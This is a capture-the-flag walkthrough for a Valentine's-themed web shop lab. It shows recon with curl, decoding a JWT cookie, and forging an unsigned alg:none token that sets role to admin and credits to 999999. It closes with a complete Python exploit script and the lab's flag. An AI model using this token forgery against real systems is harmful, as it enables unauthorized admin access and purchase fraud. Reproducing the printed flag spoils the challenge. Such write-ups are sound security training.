# TryHeartMe Shop — Full Walkthrough


## 1. Recon

Fetch the landing page:

```bash
B=http://10.48.145.31:5000
curl -s "$B/" | python3 -I -c "import sys,re,html;print(html.unescape(re.sub(r'[ \t]+',' ',re.sub(r'<[^>]+>',' ',sys.stdin.read()))))" | grep -vE '^\s*$'
```

Key facts:

- A Valentine's shop: *"Buy items using credits. **Online top-ups are currently unavailable.**"*
- Items: Rose Bouquet (120), Heart Chocolates (85), Chocolate-Dipped Strawberries (60), Love Letter Card (25) — each at `/product/<slug>`.
- Guest; must log in to buy.

Enumerate links / forms:

```bash
curl -s "$B/" | grep -oiE 'href="/[^"]*"' | sort -u
# /product/heart-choco, /product/love-letter, /product/rose-bouquet, /product/strawberry-dip, /login, /register
```

---

## 2. Register and discover the JWT

The registration form takes `email` + `password`:

```bash
curl -s "$B/register" | grep -oiE 'name="[^"]*"'
# email, password, next
```

Register and **keep the cookies** — note the two `Set-Cookie` headers:

```bash
curl -s -i -c cookies.txt -b cookies.txt \
     -d "email=hacker1@x.com&password=Pass123!" \
     "$B/register" | grep -i set-cookie
```

```
Set-Cookie: tryheartme_jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6...; Path=/; SameSite=Lax
Set-Cookie: session=...; HttpOnly; Path=/      # Flask flash messages only
```

The interesting one is **`tryheartme_jwt`**. Decode it:

```bash
python3 -I - <<'PY'
import base64, json
jwt = open('cookies.txt').read()
tok = [l.split('\t')[-1].strip() for l in jwt.splitlines() if 'tryheartme_jwt' in l][0]
h, p, s = tok.split('.')
d = lambda x: base64.urlsafe_b64decode(x + '=' * (-len(x) % 4))
print("HEADER :", d(h).decode())
print("PAYLOAD:", d(p).decode())
print("sig bytes:", len(d(s)))
PY
```

```
HEADER : {"alg":"HS256","typ":"JWT"}
PAYLOAD: {"email":"hacker1@x.com","role":"user","credits":0,"iat":1795057129,"theme":"valentine"}
sig bytes: 32
```

**Red flag:** both the **authorization** (`role`) and the **wallet balance** (`credits`) live inside a client-held token. If we can forge the token, we control both.

---

## 3. Map the attack surface

Current balance is **0** and top-ups are disabled, so a normal purchase fails:

```bash
curl -s -b cookies.txt -X POST "$B/buy/rose-bouquet" | grep -oiE 'Not enough credits[^<]*'
# "Not enough credits. Online top-ups are currently disabled."
```

Probe endpoints to find the goal:

```bash
for p in admin flag products secret dashboard orders; do
  echo "$(curl -s -b cookies.txt -o /dev/null -w '%{http_code}' "$B/$p") /$p"
done
```

```
403 /admin      <-- exists, but role-gated
404 /flag
404 /products
...
```

`/admin` returns **403 Forbidden** for a `role:user` token — that's our target.

---

## 4. The vulnerability — JWT `alg:none`

`alg:none` is an unauthenticated JWT algorithm: the token has **no signature** (empty third segment). A safe library rejects it; a vulnerable server will decode and trust the payload anyway.

We forge a token that:

- sets the header algorithm to `none`,
- escalates `role` to `admin`,
- inflates `credits` to a huge number,
- leaves the empty signature segment (`...payload.`).

### Forge script

```bash
python3 -I - <<'PY'
import base64, json
b64 = lambda b: base64.urlsafe_b64encode(b).rstrip(b'=').decode()

header  = {"alg": "none", "typ": "JWT"}
payload = {"email": "hacker1@x.com", "role": "admin",
           "credits": 999999, "iat": 1795057129, "theme": "valentine"}

tok = b64(json.dumps(header).encode()) + "." + b64(json.dumps(payload).encode()) + "."
print(tok)
PY
```

Example output (one line, note the **trailing dot** = empty signature):

```
eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJlbWFpbCI6ICJoYWNrZXIxQHguY29tIiwgInJvbGUiOiAiYWRtaW4iLCAiY3JlZGl0cyI6IDk5OTk5OSwgImlhdCI6IDE3OTUwNTcxMjksICJ0aGVtZSI6ICJ2YWxlbnRpbmUifQ.
```

### Use it against `/admin`

```bash
NONE='eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJlbWFpbCI6ICJoYWNrZXIxQHguY29tIiwgInJvbGUiOiAiYWRtaW4iLCAiY3JlZGl0cyI6IDk5OTk5OSwgImlhdCI6IDE3OTUwNTcxMjksICJ0aGVtZSI6ICJ2YWxlbnRpbmUifQ.'

curl -s -b "tryheartme_jwt=$NONE" "$B/admin" \
 | python3 -I -c "import sys,re,html;print(html.unescape(re.sub(r'[ \t]+',' ',re.sub(r'<[^>]+>',' ',sys.stdin.read()))))" | grep -vE '^\s*$'
```

```
Admin Portal
Staff session detected. Staff can purchase the ValenFlag item.
hacker1@x.com   Role: admin   Credits: 999999
Staff-only purchase
The ValenFlag item is visible to staff and prints a voucher receipt.
Open ValenFlag  ->  /product/valenflag
```

The server accepted the unsigned token **and** trusted our forged `role`/`credits`. We're now staff.

---

## 5. Buy the staff-only ValenFlag item

The admin portal reveals a hidden product `/product/valenflag` costing **777 credits** — covered by our forged balance.

```bash
# View it
curl -s -b "tryheartme_jwt=$NONE" "$B/product/valenflag" \
 | python3 -I -c "import sys,re,html;print(html.unescape(re.sub(r'[ \t]+',' ',re.sub(r'<[^>]+>',' ',sys.stdin.read()))))" | grep -iE 'valenflag|credit|buy'

# Purchase it (redirects to the receipt)
curl -s -b "tryheartme_jwt=$NONE" -X POST "$B/buy/valenflag" | grep -oiE '/receipt/[^" ]*'
# /receipt/valenflag
```

### Read the receipt → flag

```bash
curl -s -b "tryheartme_jwt=$NONE" "$B/receipt/valenflag" | grep -oE 'THM\{[^}]*\}'
```

```
THM{v4l3nt1n3_jwt_c00k13_t4mp3r_4dm1n_sh0p}
```

### 🚩 Flag

```
THM{v4l3nt1n3_jwt_c00k13_t4mp3r_4dm1n_sh0p}
```

---

## 6. Full exploit script (end-to-end)

```python
#!/usr/bin/env python3
# exploit.py — forge an alg:none admin JWT and buy the ValenFlag item
import base64, json, re, requests

B = "http://10.48.145.31:5000"
b64 = lambda b: base64.urlsafe_b64encode(b).rstrip(b"=").decode()

# 1) craft an unsigned (alg:none) admin token with inflated credits
header  = {"alg": "none", "typ": "JWT"}
payload = {"email": "pwn@x.com", "role": "admin", "credits": 999999,
           "iat": 1795057129, "theme": "valentine"}
token = b64(json.dumps(header).encode()) + "." + b64(json.dumps(payload).encode()) + "."

s = requests.Session()
s.cookies.set("tryheartme_jwt", token)

# 2) confirm admin access
assert "Admin Portal" in s.get(f"{B}/admin").text, "alg:none not accepted"

# 3) buy the staff-only ValenFlag item, follow to the receipt
s.post(f"{B}/buy/valenflag")
receipt = s.get(f"{B}/receipt/valenflag").text

# 4) extract the flag
print(re.search(r"THM\{[^}]*\}", receipt).group(0))
```

```bash
python3 exploit.py
# THM{v4l3nt1n3_jwt_c00k13_t4mp3r_4dm1n_sh0p}
```

---

## 7. Attack chain summary

```
/register           → server issues JWT cookie {role:"user", credits:0}
/admin              → 403 (role-gated) = the target
decode JWT          → HS256, role + credits are client-controlled
forge alg:none      → header {"alg":"none"}, payload {role:"admin", credits:999999}, empty sig
/admin              → accepted → Admin Portal unlocks /product/valenflag (777 credits)
POST /buy/valenflag → forged balance covers it → /receipt/valenflag
/receipt/valenflag  → FLAG
```
